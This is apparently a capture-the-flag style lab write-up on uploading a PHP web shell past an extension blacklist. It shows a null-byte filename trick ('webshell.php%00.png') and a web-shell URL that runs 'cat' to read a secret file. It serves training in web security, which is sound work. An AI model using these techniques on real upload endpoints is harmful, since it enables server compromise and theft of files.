Title: Web shell upload via obfuscated file extension
Level: Practitioner
Desc:  This lab contains a vulnerable image upload function. Certain file extensions are blacklisted, but this defense can be bypassed using a classic obfuscation technique.
To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner.
You can log in to your own account using the following credentials: wiener:peter 


Trying some tricks from last labs:
a) just adding php webshell
![image](https://github.com/user-attachments/assets/c4d8d52b-bbfe-426f-a947-f5ba2257d737)
b) intercepting and changing file from .png to .php - not working also
c) new idea - using null byte: `filename="webshell.php%00.png"`
![image](https://github.com/user-attachments/assets/207fb835-4e20-4459-81c6-a852952acbf9)

Here we go again!
![image](https://github.com/user-attachments/assets/8b51f356-7577-44c6-a22b-a5efb9e534e1)
URL to attack: `https://0a6d008f03e6bcbd80bb8aaa00f60099.web-security-academy.net/files/avatars/webshell.php?cmd=cat+/home/carlos/secret`








